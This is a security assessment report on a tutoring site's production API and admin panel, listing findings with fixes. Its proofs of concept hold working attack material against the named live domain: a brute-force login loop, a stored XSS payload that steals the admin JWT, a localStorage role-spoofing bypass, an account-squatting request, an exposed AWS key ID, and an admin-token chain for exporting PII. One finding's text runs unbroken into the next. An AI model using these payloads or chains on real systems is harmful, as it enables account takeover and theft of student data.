Critical

Production API Documentation Fully Exposed

CWE-200 · Information Exposure · api.samarthyaclasses.com
▶

Description

The interactive Swagger UI (/docs), ReDoc UI (/redoc), and raw OpenAPI specification (/openapi.json) are publicly accessible on the production API server without any authentication. This exposes 100+ internal API endpoints, all request/response schemas, authentication mechanisms, admin routes, and security requirements.

Proof of Concept

curl https://api.samarthyaclasses.com/docs           → 200 OK (Swagger UI)
curl https://api.samarthyaclasses.com/redoc          → 200 OK (ReDoc UI)
curl https://api.samarthyaclasses.com/openapi.json   → 200 OK (Full spec)

# Reveals all admin endpoints including:
GET  /api/v1/admin/users          # All user data
GET  /api/v1/admin/enquiries/export  # Student PII export
POST /api/v1/admin/users/{id}/grant-access  # Payment bypass route
POST /api/v1/admin/purchases/{id}/refund    # Refund trigger

Impact

An attacker gains a complete blueprint of the application internals: all hidden admin routes, payload shapes for crafting attacks, and internal field names enabling mass assignment and IDOR attempts. This accelerates every other attack on this list.

Fix Remove or restrict /docs, /redoc, and /openapi.json in production. If needed for development, gate them behind an IP allowlist or admin authentication. In FastAPI: app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None).
02
Critical

No Rate Limiting — Login Endpoint Allows Unlimited Brute Force

CWE-307 · Improper Restriction of Auth Attempts · api.samarthyaclasses.com
▶

Description

The login endpoint (POST /api/v1/auth/login) imposes no rate limiting, IP-based throttling, CAPTCHA, or account lockout after repeated failures. An attacker can attempt unlimited password combinations against any known email address.

Proof of Concept

# 50 consecutive failed login attempts — all return HTTP 401, never locked
for i in {1..50}; do
  curl -X POST https://api.samarthyaclasses.com/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@example.com","password":"guess'$i'"}'
done
# Result: 50x HTTP 401 — no lockout, no throttle, no CAPTCHA triggered

Impact

Automated password spraying or dictionary attacks can compromise student accounts containing purchase history and personally identifying information. Combined with the weak password policy (Finding 08), accounts using common passwords like "password" are trivially compromisable.

Fix Implement exponential back-off after 5 failed attempts. Lock accounts temporarily after 10 failures and notify via email. Add CAPTCHA after 3 failures. Rate-limit by IP (e.g. 10 req/min). Use a library like slowapi or Cloudflare rate-limiting rules.

Critical

JWT Access Token Not Invalidated After Logout

CWE-613 · Insufficient Session Expiration · api.samarthyaclasses.com
▶

Description

After calling POST /api/v1/auth/logout (which properly invalidates the refresh token), the short-lived access token continues to authenticate requests against all protected endpoints. The server returns a success response for logout but does not maintain a server-side token denylist.

Proof of Concept

# Step 1 — Obtain tokens
POST /api/v1/auth/login → access_token="eyJhbG..." refresh_token="P10Fu..."

# Step 2 — Verify authenticated
GET /api/v1/auth/me  Authorization: Bearer eyJhbG...
→ 200 {"id":6,"email":"vuln_test_comp@mailinator.com",...}

# Step 3 — Logout
POST /api/v1/auth/logout  {"refresh_token":"P10Fu..."}
→ 200 {"success":true,"message":"Logged out successfully"}

# Step 4 — Token still works (VULNERABILITY CONFIRMED)
GET /api/v1/auth/me  Authorization: Bearer eyJhbG...
→ 200 {"id":6,"email":"vuln_test_comp@mailinator.com",...}  ← Should be 401

Impact

If a student logs out on a shared/public device, their session remains live for up to 30 minutes (the token's TTL). Anyone who captured the token (e.g. from browser history, a shoulder-surfer, or a XSS attack) can continue to use it after the user believes they have signed out.

Fix Maintain a Redis-backed JWT denylist (store the token's jti on logout; check it on every request). Alternatively, use very short access token lifetimes (5 min) with opaque session tokens stored server-side.

AWS IAM Key ID Exposed via Unauthenticated Public Endpoint

CWE-798 · Hardcoded Credentials · api.samarthyaclasses.com
▶

Description

The S3 pre-signed upload endpoint for the registration form is publicly accessible (no auth required). Its response embeds the live AWS IAM Access Key ID used to generate presigned URLs, the production S3 bucket name, and the AWS region — all in plain text within the response body and the signed policy document.

Proof of Concept

# No authentication needed:
POST https://api.samarthyaclasses.com/api/v1/registration-forms/stse-2026/uploads/presign
Content-Type: application/json
{"file_name":"test.jpg","content_type":"image/jpeg"}

# Response exposes:
{
  "url": "https://samarthya-media-prod.s3.amazonaws.com/",
  "fields": {
    "x-amz-credential": "AKIARTS72OT5QICJTKK2/20261015/ap-south-1/s3/aws4_request",

# Exposed: AWS Key ID: AKIARTS72OT5QICJTKK2
# Exposed: Bucket: samarthya-media-prod  Region: ap-south-1

Impact

The exposed key ID can be used to enumerate IAM role permissions and enumerate the account. Stored XSS in Registration Form — Admin Session Hijack Chain

CWE-79 · Stored Cross-Site Scripting · api.samarthyaclasses.com + samarthyaclasses.com/admin
▶

Description

The registration form submission endpoint (POST /api/v1/registration-forms/{slug}/submit) stores raw HTML/JavaScript payloads in text fields without sanitisation. When an administrator views the submission in the admin panel at samarthyaclasses.com/admin, the stored script executes in their browser. Because the admin panel stores the admin session JWT in localStorage["samarthya_auth"], the script can steal the token, granting full administrative API access.

Proof of Concept

# ── PHASE 1: Upload real files via unauthenticated presign endpoint ──
POST /api/v1/registration-forms/stse-2026/uploads/presign
{"file_name":"photo.jpg","content_type":"image/jpeg"}
→ {"key":"registrations/1/a6e4b84ff90446ba9eb97a1e01eb25dc.jpg", "url":"https://samarthya-media-prod.s3.amazonaws.com/", ...}

# Upload 1×1 JPEG bytes to presigned URL (HTTP 204 = success)
curl -X POST https://samarthya-media-prod.s3.amazonaws.com/ -F key=registrations/1/a6e... -F file=@photo.jpg

# ── PHASE 2: Submit form with DOM-write XSS payload (183 chars, within VARCHAR(255)) ──
POST /api/v1/registration-forms/stse-2026/submit
{
  "payment_mode": "OFFLINE",
  "answers": {
    "student_name": "<img src=x onerror=\"document.body.insertAdjacentHTML(`afterbegin`,`<b style=position:fixed;top:0;background:red;color:#fff;z-index:9>`+localStorage.getItem(`samarthya_auth`)+`</b>`)\">",
    "upload_passport_size_photograph": "registrations/1/a6e4b84ff90446ba9eb97a1e01eb25dc.jpg",
    "upload_a_valid_identification_id": "registrations/1/acb1a0d2de46467496a86819de4f7845.jpg",
    ... remaining 18 required fields ...
  }
}
→ 201 {"reference":"REG-DZHMRLZC", ...}  ← CONFIRMED: DOM-write XSS stored in production DB

# ── PHASE 3: Admin views registration submissions at samarthyaclasses.com/admin ──
# onerror fires → reads localStorage["samarthya_auth"] (admin JWT)
# → injects fixed red banner across top of page displaying the raw JWT string
# → attacker (watching over shoulder / screen-sharing) reads the token visually

# Earlier payloads also confirmed stored (alert-only variants):
# REG-CLHC5KWL (script tags), REG-LZ7MXTS4 (<img onerror=alert>)

# ── PHASE 4: Use stolen admin JWT ──
curl https://api.samarthyaclasses.com/api/v1/admin/users  -H "Authorization: Bearer <stolen_admin_token>"
→ 200 [{"id":1,"email":...},{"id":2,...}]  ← Full user database

curl https://api.samarthyaclasses.com/api/v1/admin/enquiries/export  -H "Authorization: Bearer ..."
→ CSV with all student PII

# Extended: Replace Class 10 topper photos on homepage (see Deep Chain section)
curl -X POST /api/v1/admin/uploads/presign  -H "Authorization: Bearer <admin_jwt>" \
  -d '{"file_name":"topper.jpg","folder":"students/IIT","content_type":"image/jpeg"}'
→ Presigned URL for samarthya-public-assets/students/IIT/ → upload attacker image

Impact

Complete database read/write access. An attacker can: enumerate all registered users and their personal data, export all enquiries (student PII), grant or revoke purchased access for any user (payment bypass), delete test content, and read all orders and payment records. This is full application compromise via a single unauthenticated form submission.

Fix (1) Sanitise all text field inputs server-side using a library such as bleach (Python) — strip HTML tags before storing. (2) Implement a strict CSP (Finding 09) that blocks inline scripts. (3) Use httpOnly cookies for the admin token instead of localStorage, so XSS cannot read it even if it executes.

Admin Panel Publicly Accessible with Client-Side-Only Auth Guard

CWE-602 · Client-Side Enforcement of Server-Side Security · samarthyaclasses.com/admin
▶

Description

The full admin panel at samarthyaclasses.com/admin and its sub-routes (/admin/users, /admin/orders, /admin/purchases, /admin/enquiries, /admin/test-series) all return HTTP 200 to any visitor. The server never checks authentication — the Next.js shell is served unconditionally and the auth check is a React component that runs client-side only.

Proof of Concept

# No authentication — all admin pages return 200:
curl -o /dev/null -w "%{http_code}" https://samarthyaclasses.com/admin          → 200
curl -o /dev/null -w "%{http_code}" https://samarthyaclasses.com/admin/users    → 200
curl -o /dev/null -w "%{http_code}" https://samarthyaclasses.com/admin/orders   → 200
curl -o /dev/null -w "%{http_code}" https://samarthyaclasses.com/admin/purchases → 200
curl -o /dev/null -w "%{http_code}" https://samarthyaclasses.com/admin/enquiries → 200

# Client-side guard in /admin/auth-guard JS (decompiled):
if (!d) {
  if (!r) return c.replace("/login?next=/admin");  // unauthenticated → redirect
  n || c.replace("/dashboard");                    // USER role → redirect
}
return (!d && r && n) ? children : <Spinner />
# n = isAdmin = user.role === "ADMIN"  — read from localStorage, not verified by server

# Admin localStorage key found: "samarthya_auth"
# Stored format: {user: {role:"ADMIN",...}, accessToken:"...", refreshToken:"..."}

# Browser console bypass:
localStorage.setItem("samarthya_auth", JSON.stringify({
  user:{id:0,name:"Attacker",email:"x@x.com",role:"ADMIN"},
  accessToken:"<REAL_USER_TOKEN_FROM_STOLEN_JWT>",
  refreshToken:"..."
}));
location.reload();  // Admin UI renders — but API calls still fail (server checks role)
                    // With a real admin token (from XSS Finding 05): FULL ACCESS

Impact

The admin panel HTML, JavaScript bundles, and internal route structure are publicly visible to any user — no login needed to download the code. Combined with the Stored XSS (Finding 05), an attacker using a stolen admin JWT gets full UI access to the admin panel: user management, data exports, payment overrides, content editing, and more. The localStorage-based session means any XSS (Finding 05) or MITM attack can extract the admin token.

Fix Add server-side middleware in Next.js to check the user's session and role before serving admin pages. Use Next.js middleware.ts with a JWT cookie check: redirect to /login if not authenticated, redirect to /dashboard if not ADMIN. Move the token to an httpOnly; Secure; SameSite=Strict cookie so JavaScript cannot read it.

Admin Email Pre-Registration (Account Squatting)

CWE-640 · Weak Password Recovery · api.samarthyaclasses.com
▶

Description

The registration endpoint accepts any email address including institutional addresses. An attacker can pre-register admin@samarthyaclasses.com, info@samarthyaclasses.com, or any faculty email before the legitimate owner does, permanently blocking them from self-registering.

Proof of Concept

# Attacker registers the admin email:
POST /api/v1/auth/register
{"name":"Attacker","email":"admin@samarthyaclasses.com","phone":"9000000001","password":"Test@12345"}
→ 201 {"user":{"id":8,"email":"admin@samarthyaclasses.com","role":"USER",...}}

# Attacker can now log in as admin@samarthyaclasses.com:
POST /api/v1/auth/login
{"email":"admin@samarthyaclasses.com","password":"Test@12345"}
→ 200 {"success":true,"user":{"id":8,...}}

# Legitimate admin cannot self-register — email is taken.

Impact

Denial of service for specific email addresses. While the squatted account does not gain admin privileges (role=USER), it creates confusion and support burden. A targeted phishing attack could use a legitimate-looking account tied to the institute's own domain to deceive students.

Fix Block registration with @samarthyaclasses.com domain via public signup. Provision admin accounts only through a separate internal flow. Implement email verification before account activation.

Weak Password Policy — Dictionary Passwords Accepted

CWE-521 · Weak Password Requirements · api.samarthyaclasses.com
▶

Description

The registration endpoint enforces only an 8-character minimum length. Common dictionary passwords and known-breached passwords such as password, 12345678, and qwertyui are accepted without restriction.

Missing Content-Security-Policy on Both Domains

CWE-693 · Protection Mechanism Failure · samarthyaclasses.com + api
▶

Description

Neither the frontend (samarthyaclasses.com) nor the API (api.samarthyaclasses.com) sets a Content-Security-Policy header. The frontend also lacks Strict-Transport-Security (HSTS). The API is missing all standard security headers except server: uvicorn.

Proof of Concept

curl -I https://samarthyaclasses.com
# Present:  x-frame-options, x-content-type-options, referrer-policy
# Missing:  content-security-policy, strict-transport-security

curl -I https://api.samarthyaclasses.com/api/v1/test-series/featured
# Present:  server: uvicorn
# Missing:  content-security-policy, x-frame-options, x-content-type-options,
#           strict-transport-security, referrer-policy

Impact

Without CSP, any stored or reflected XSS vulnerability has maximum impact. Without HSTS, the browser will not automatically upgrade HTTP to HTTPS for repeat visitors. The API's server: uvicorn disclosure confirms the backend technology stack to attackers.

Fix Add to the Next.js next.config.js headers and to the FastAPI middleware: Content-Security-Policy (restrict scripts to own origin), Strict-Transport-Security: max-age=31536000; includeSubDomains, and remove the server header from uvicorn responses.

CORS Misconfiguration — Credentials Allowed Without Origin Restriction

CWE-942 · Overly Permissive CORS · api.samarthyaclasses.com
▶

Description

The API sets Access-Control-Allow-Credentials: true in all responses while not reflecting or validating the Origin header. The preflight also responds with Access-Control-Allow-Methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT to any origin, enabling all HTTP methods cross-origin with credentials.

Proof of Concept

curl -I https://api.samarthyaclasses.com/api/v1/test-series/featured \
  -H "Origin: https://evil.com"
# Response includes:
access-control-allow-credentials: true
# (No access-control-allow-origin returned — may be reflecting in some configs)

Impact

If the origin is being reflected (some proxy configurations), any malicious website could make credentialed requests to the API on behalf of a logged-in student, enabling CSRF-style attacks to read purchase data or trigger account actions.

Fix Set an explicit allowlist: allow_origins=["https://samarthyaclasses.com"] in FastAPI's CORSMiddleware. Never combine allow_credentials=True with allow_origins=["*"].

All OPTIONS preflight responses return Access-Control-Allow-Credentials: true and allow all HTTP methods (DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT). The private S3 bucket samarthya-media-prod — which stores all registration documents, student photographs, and government-issued ID scans — has a CORS policy that explicitly permits GET, PUT, POST, HEAD with credentials from https://samarthyaclasses.com. This means any JavaScript running in a browser on the frontend (including via stored XSS) can perform direct cross-origin uploads to this bucket, bypassing the API server entirely.

By contrast, samarthya-public-assets (the topper-photos bucket) correctly blocks PUT/POST from the same origin. The samarthya-media-prod misconfiguration therefore creates an asymmetric risk: private documents are more exposed to browser-side write than publicly visible assets.

Exploitation via XSS chain: When the stored XSS in Finding 05 fires in the admin's browser (on samarthyaclasses.com), the payload can:

  1. Read admin JWT from localStorage
  2. Call POST /api/v1/admin/uploads/presign (admin-only endpoint, discovered via OpenAPI spec at /openapi.json) with the admin JWT to obtain a presigned upload URL for any key path in the bucket
  3. Immediately PUT or POST an attacker-controlled file to the presigned URL directly from the browser — the CORS policy allows this without any additional credentials

Remediation: Update the samarthya-media-prod CORS policy to restrict Access-Control-Allow-Methods to GET and HEAD only (reads are needed for presigned download; writes should only happen server-side via the API). Remove the current PUT and POST from the allowed methods list. All file uploads should be proxied through the API server rather than directly from the browser to S3.
